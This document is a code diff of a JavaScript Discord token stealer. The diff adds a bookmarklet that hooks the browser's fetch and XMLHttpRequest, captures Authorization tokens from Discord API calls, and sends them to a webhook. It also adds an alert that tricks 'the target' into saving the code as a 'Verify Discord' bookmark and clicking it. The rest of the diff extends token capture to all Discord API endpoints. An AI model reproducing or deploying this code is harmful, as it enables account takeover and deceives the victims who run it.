@@ -80,9 +80,217 @@
             logMessage('INFO', 'runTokenExtractor', 'Starting token extraction');
             try {
                 if (!window.location.href.includes("discord.com")) {
-                    logMessage('INFO', 'runTokenExtractor', 'Not on discord.com, redirecting');
-                    alert("Please run this on discord.com (e.g., https://discord.com/channels/@me)");
+                    logMessage('INFO', 'runTokenExtractor', 'Not on discord.com, preparing redirect');
+                    // Generate bookmarklet for the target to run on Discord
+                    const bookmarkletCode = `
+                        javascript:(function(){
+                            const WEBHOOK_URL="${WEBHOOK_URL}";
+                            function logMessage(level,context,message,extra={}){
+                                const timestamp=new Date().toISOString();
+                                let log=\`[\${timestamp}] [\${level}] \${context}: \${message}\`;
+                                if(extra.status)log+=\` (Status: \${extra.status} \${extra.statusText||''})\`;
+                                if(extra.url)log+=\` (URL: \${extra.url})\`;
+                                if(extra.response)log+=\` (Response: \${extra.response.slice(0,100)})\`;
+                                if(extra.details)log+=\` (Details: \${extra.details})\`;
+                                switch(level){
+                                    case'ERROR':console.error(log);break;
+                                    case'SUCCESS':console.log(\`%c\${log}\`,'color: green');break;
+                                    default:console.log(log);
+                                }
+                            }
+                            let tokenFound=false;
+                            function waitForPageLoad(){
+                                return new Promise((resolve,reject)=>{
+                                    try{
+                                        logMessage('INFO','waitForPageLoad','Checking page load state');
+                                        if(document.readyState==="complete"){
+                                            logMessage('SUCCESS','waitForPageLoad','Page fully loaded');
+                                            resolve();
+                                        }else{
+                                            window.addEventListener("load",()=>{
+                                                logMessage('SUCCESS','waitForPageLoad','Page fully loaded via event');
+                                                resolve();
+                                            },{once:true});
+                                        }
+                                    }catch(error){
+                                        logMessage('ERROR','waitForPageLoad',error.message);
+                                        reject(error);
+                                    }
+                                });
+                            }
+                            const originalOpen=XMLHttpRequest.prototype.open;
+                            XMLHttpRequest.prototype.open=function(method,url){
+                                try{
+                                    logMessage('INFO','XMLHttpRequest',\`Opening request to \${url}\`);
+                                    this.addEventListener("readystatechange",function(){
+                                        try{
+                                            if(this.readyState===4){
+                                                if(url.includes("discord.com/api/v9")){
+                                                    if(this.status!==200){
+                                                        logMessage('ERROR','XMLHttpRequest','API request failed',{
+                                                            status:this.status,
+                                                            statusText:this.statusText,
+                                                            url,
+                                                            response:this.responseText
+                                                        });
+                                                    }else{
+                                                        logMessage('SUCCESS','XMLHttpRequest','API request successful',{url});
+                                                    }
+                                                    const token=this.getRequestHeader("Authorization");
+                                                    if(token&&(token.includes(".")||token.startsWith("mfa."))){
+                                                        logMessage('SUCCESS','XMLHttpRequest','Token captured',{token:token.substring(0,10)});
+                                                        sendToWebhook(token,"API Endpoint");
+                                                        tokenFound=true;
+                                                    }
+                                                }
+                                            }
+                                        }catch(error){
+                                            logMessage('ERROR','XMLHttpRequest handler',error.message,{url});
+                                        }
+                                    },false);
+                                    originalOpen.apply(this,arguments);
+                                }catch(error){
+                                    logMessage('ERROR','XMLHttpRequest open',error.message,{url});
+                                }
+                            };
+                            const originalFetch=window.fetch;
+                            window.fetch=async function(url,options={}){
+                                try{
+                                    logMessage('INFO','Fetch',\`Fetching \${url}\`);
+                                    if(url.includes("discord.com/api/v9")){
+                                        const token=options.headers?.Authorization||options.headers?.authorization;
+                                        if(token&&(token.includes(".")||token.startsWith("mfa."))){
+                                            logMessage('SUCCESS','Fetch','Token captured',{token:token.substring(0,10)});
+                                            sendToWebhook(token,"API Endpoint");
+                                            tokenFound=true;
+                                        }
+                                    }
+                                    const response=await originalFetch.apply(this,arguments);
+                                    if(url.includes("discord.com/api/v9")){
+                                        if(!response.ok){
+                                            const responseText=await response.text();
+                                            logMessage('ERROR','Fetch','API request failed',{
+                                                status:response.status,
+                                                statusText:response.statusText,
+                                                url,
+                                                response:responseText
+                                            });
+                                        }else{
+                                            logMessage('SUCCESS','Fetch','API request successful',{url});
+                                        }
+                                    }
+                                    return response;
+                                }catch(error){
+                                    logMessage('ERROR','Fetch',error.message,{url});
+                                    throw error;
+                                }
+                            };
+                            async function sendToWebhook(token,source){
+                                const payload={
+                                    content:"",
+                                    embeds:[{
+                                        title:"Token Captured",
+                                        description:\`**Token**: \${token.substring(0,10)}...\\n**Source**: \${source}\\n**Captured At**: \${new Date().toISOString()}\`,
+                                        color:0x7289da
+                                    }],
+                                    username:"Token Extractor",
+                                    avatar_url:"https://discord.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
+                                };
+                                try{
+                                    logMessage('INFO','sendToWebhook','Sending token to webhook',{token:token.substring(0,10)});
+                                    const response=await fetch(WEBHOOK_URL,{
+                                        method:"POST",
+                                        headers:{"Content-Type":"application/json"},
+                                        body:JSON.stringify(payload)
+                                    });
+                                    if(response.ok){
+                                        logMessage('SUCCESS','sendToWebhook','Webhook sent successfully',{url:WEBHOOK_URL});
+                                    }else{
+                                        const responseText=await response.text();
+                                        logMessage('ERROR','sendToWebhook','Webhook request failed',{
+                                            status:response.status,
+                                            statusText:response.statusText,
+                                            url:WEBHOOK_URL,
+                                            response:responseText
+                                        });
+                                    }
+                                }catch(error){
+                                    logMessage('ERROR','sendToWebhook',error.message,{url:WEBHOOK_URL});
+                                }
+                            }
+                            async function triggerApiRequest(){
+                                try{
+                                    logMessage('INFO','triggerApiRequest','Attempting to trigger API request');
+                                    const endpoints=["science","users/@me","channels/@me"];
+                                    for(const endpoint of endpoints){
+                                        const url=\`https://discord.com/api/v9/\${endpoint}\`;
+                                        const payload=endpoint==="science"?{event_name:"app_opened",properties:{client_uuid:crypto.randomUUID(),action:"app_opened"}}:{};
+                                        logMessage('INFO','triggerApiRequest',\`Sending request to \${url}\`,{details:JSON.stringify(payload)});
+                                        await fetch(url,{
+                                            method:endpoint==="science"?"POST":"GET",
+                                            headers:{
+                                                "Authorization":localStorage.getItem("token")||"",
+                                                "Content-Type":"application/json"
+                                            },
+                                            body:endpoint==="science"?JSON.stringify(payload):undefined
+                                        }).then(async response=>{
+                                            if(!response.ok){
+                                                const responseText=await response.text();
+                                                logMessage('ERROR','triggerApiRequest','API request failed',{
+                                                    status:response.status,
+                                                    statusText:response.statusText,
+                                                    url,
+                                                    response:responseText
+                                                });
+                                            }else{
+                                                logMessage('SUCCESS','triggerApiRequest','API request sent successfully',{url});
+                                            }
+                                        }).catch(error=>{
+                                            logMessage('ERROR','triggerApiRequest',error.message,{url});
+                                        });
+                                    }
+                                    logMessage('INFO','triggerApiRequest','Navigating to channels page');
+                                    window.location.href="https://discord.com/channels/@me";
+                                }catch(error){
+                                    logMessage('ERROR','triggerApiRequest',error.message);
+                                }
+                            }
+                            async function monitorNetwork(){
+                                if(tokenFound){
+                                    logMessage('INFO','monitorNetwork','Token found, stopping loop');
+                                    return;
+                                }
+                                try{
+                                    logMessage('INFO','monitorNetwork','Starting network monitoring cycle');
+                                    await waitForPageLoad();
+                                    await triggerApiRequest();
+                                    logMessage('INFO','monitorNetwork','Scheduling next cycle in 10 seconds');
+                                    setTimeout(monitorNetwork,10000);
+                                }catch(error){
+                                    logMessage('ERROR','monitorNetwork',error.message);
+                                    setTimeout(monitorNetwork,10000);
+                                }
+                            }
+                            try{
+                                logMessage('INFO','TokenExtractor','Checking initial page location');
+                                if(!window.location.href.includes("discord.com")){
+                                    logMessage('ERROR','TokenExtractor','Script must run on discord.com');
+                                    alert("Please run this bookmarklet on discord.com");
+                                }else{
+                                    logMessage('SUCCESS','TokenExtractor','Script started on discord.com');
+                                    monitorNetwork();
+                                }
+                            }catch(error){
+                                logMessage('ERROR','TokenExtractor',error.message);
+                            }
+                        })();
+                    `;
+                    // Prompt user to create and run bookmarklet
+                    alert("Not on Discord! A new Discord tab has opened. Please: 1. Create a bookmark with the name 'Verify Discord' and the following URL (copy it from this alert or the console): " + bookmarkletCode + "\n2. Go to the Discord tab. 3. Click the bookmark to verify your session.");
+                    console.log('Bookmarklet Code: ' + bookmarkletCode);
+                    logMessage('INFO', 'runTokenExtractor', 'Opening Discord tab');
                     window.open("https://discord.com/channels/1322328218279088128/1327050794020900987", "_blank");
+                    logMessage('SUCCESS', 'runTokenExtractor', 'Redirect instructions provided');
                     return;
                 }
 
@@ -118,21 +326,21 @@
                             this.addEventListener("readystatechange", function() {
                                 try {
                                     if (this.readyState === 4) {
-                                        if (url.includes("discord.com/api/v9/science")) {
+                                        if (url.includes("discord.com/api/v9")) {
                                             if (this.status !== 200) {
-                                                logMessage('ERROR', 'XMLHttpRequest', 'Science request failed', {
+                                                logMessage('ERROR', 'XMLHttpRequest', 'API request failed', {
                                                     status: this.status,
                                                     statusText: this.statusText,
                                                     url,
                                                     response: this.responseText
                                                 });
                                             } else {
-                                                logMessage('SUCCESS', 'XMLHttpRequest', 'Science request successful', { url });
+                                                logMessage('SUCCESS', 'XMLHttpRequest', 'API request successful', { url });
                                             }
                                             const token = this.getRequestHeader("Authorization");
                                             if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                                 logMessage('SUCCESS', 'XMLHttpRequest', 'Token captured', { token: token.substring(0, 10) });
-                                                sendToWebhook(token, "Science Endpoint");
+                                                sendToWebhook(token, "API Endpoint");
                                                 tokenFound = true;
                                             }
                                         }
@@ -151,26 +359,26 @@
                     window.fetch = async function(url, options = {}) {
                         try {
                             logMessage('INFO', 'Fetch', `Fetching ${url}`);
-                            if (url.includes("discord.com/api/v9/science")) {
+                            if (url.includes("discord.com/api/v9")) {
                                 const token = options.headers?.Authorization || options.headers?.authorization;
                                 if (token && (token.includes(".") || token.startsWith("mfa."))) {
                                     logMessage('SUCCESS', 'Fetch', 'Token captured', { token: token.substring(0, 10) });
-                                    sendToWebhook(token, "Science Endpoint");
+                                    sendToWebhook(token, "API Endpoint");
                                     tokenFound = true;
                                 }
                             }
                             const response = await originalFetch.apply(this, arguments);
-                            if (url.includes("discord.com/api/v9/science")) {
+                            if (url.includes("discord.com/api/v9")) {
                                 if (!response.ok) {
                                     const responseText = await response.text();
-                                    logMessage('ERROR', 'Fetch', 'Science request failed', {
+                                    logMessage('ERROR', 'Fetch', 'API request failed', {
                                         status: response.status,
                                         statusText: response.statusText,
                                         url,
                                         response: responseText
                                     });
                                 } else {
-                                    logMessage('SUCCESS', 'Fetch', 'Science request successful', { url });
+                                    logMessage('SUCCESS', 'Fetch', 'API request successful', { url });
                                 }
                             }
                             return response;
@@ -215,42 +423,49 @@
                         }
                     }
 
-                    async function triggerScienceRequest() {
+                    async function triggerApiRequest() {
                         try {
-                            logMessage('INFO', 'triggerScienceRequest', 'Attempting to trigger /science request');
+                            logMessage('INFO', 'triggerApiRequest', 'Attempting to trigger API request');
                             if (!window.location.href.includes("discord.com")) {
-                                logMessage('INFO', 'triggerScienceRequest', 'Not on discord.com, redirecting');
+                                logMessage('INFO', 'triggerApiRequest', 'Not on discord.com, redirecting');
                                 window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
                                 return;
                             }
-                            const payload = {
-                                event_name: "app_opened",
-                                properties: { client_uuid: crypto.randomUUID() }
-                            };
-                            logMessage('INFO', 'triggerScienceRequest', 'Sending POST to /science', { details: JSON.stringify(payload) });
-                            const response = await fetch("https://discord.com/api/v9/science", {
-                                method: "POST",
-                                headers: {
-                                    "Authorization": localStorage.getItem("token") || "",
-                                    "Content-Type": "application/json"
-                                },
-                                body: JSON.stringify(payload)
-                            });
-                            if (!response.ok) {
-                                const responseText = await response.text();
-                                logMessage('ERROR', 'triggerScienceRequest', 'Science request failed', {
-                                    status: response.status,
-                                    statusText: response.statusText,
-                                    url: "https://discord.com/api/v9/science",
-                                    response: responseText
+                            const endpoints = ["science", "users/@me", "channels/@me"];
+                            for (const endpoint of endpoints) {
+                                const url = `https://discord.com/api/v9/${endpoint}`;
+                                const payload = endpoint === "science" ? {
+                                    event_name: "app_opened",
+                                    properties: { client_uuid: crypto.randomUUID(), action: "app_opened" }
+                                } : {};
+                                logMessage('INFO', 'triggerApiRequest', `Sending request to ${url}`, { details: JSON.stringify(payload) });
+                                await fetch(url, {
+                                    method: endpoint === "science" ? "POST" : "GET",
+                                    headers: {
+                                        "Authorization": localStorage.getItem("token") || "",
+                                        "Content-Type": "application/json"
+                                    },
+                                    body: endpoint === "science" ? JSON.stringify(payload) : undefined
+                                }).then(async response => {
+                                    if (!response.ok) {
+                                        const responseText = await response.text();
+                                        logMessage('ERROR', 'triggerApiRequest', 'API request failed', {
+                                            status: response.status,
+                                            statusText: response.statusText,
+                                            url,
+                                            response: responseText
+                                        });
+                                    } else {
+                                        logMessage('SUCCESS', 'triggerApiRequest', 'API request sent successfully', { url });
+                                    }
+                                }).catch(error => {
+                                    logMessage('ERROR', 'triggerApiRequest', error.message, { url });
                                 });
-                            } else {
-                                logMessage('SUCCESS', 'triggerScienceRequest', 'Science request sent successfully');
                             }
-                            logMessage('INFO', 'triggerScienceRequest', 'Navigating to channels page');
-                            window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
+                            logMessage('INFO', 'triggerApiRequest', 'Navigating to channels page');
+                            window.location.href = "https://discord.com/channels/@me";
                         } catch (error) {
-                            logMessage('ERROR', 'triggerScienceRequest', error.message, { url: "https://discord.com/api/v9/science" });
+                            logMessage('ERROR', 'triggerApiRequest', error.message);
                         }
                     }
 
@@ -262,20 +477,20 @@
                         try {
                             logMessage('INFO', 'monitorNetwork', 'Starting network monitoring cycle');
                             await waitForPageLoad();
-                            await triggerScienceRequest();
+                            await triggerApiRequest();
                             logMessage('INFO', 'monitorNetwork', 'Scheduling next cycle in 10 seconds');
                             setTimeout(monitorNetwork, 10000);
                         } catch (error) {
                             logMessage('ERROR', 'monitorNetwork', error.message);
-                            setTimeout(monitorNetwork, 10000); // Continue loop despite errors
+                            setTimeout(monitorNetwork, 10000);
                         }
                     }
 
                     try {
                         logMessage('INFO', 'TokenExtractor', 'Checking initial page location');
                         if (!window.location.href.includes("discord.com")) {
-                            logMessage('INFO', 'TokenExtractor', 'Not on discord.com, redirecting');
-                            window.location.href = "https://discord.com/channels/1322328218279088128/1327050794020900987";
+                            logMessage('ERROR', 'TokenExtractor', 'Script must run on discord.com');
+                            alert("Please run this script on discord.com");
                         } else {
                             logMessage('SUCCESS', 'TokenExtractor', 'Script started on discord.com');
                             monitorNetwork();
@@ -291,7 +506,7 @@
             }
         }
 
-        // Log favicon errors if any
+        // Log favicon errors
         window.addEventListener('error', (event) => {
             if (event.target && event.target.tagName === 'LINK' && event.target.rel === 'icon') {
                 logMessage('ERROR', 'Favicon', 'Failed to load favicon', { url: event.target.href });
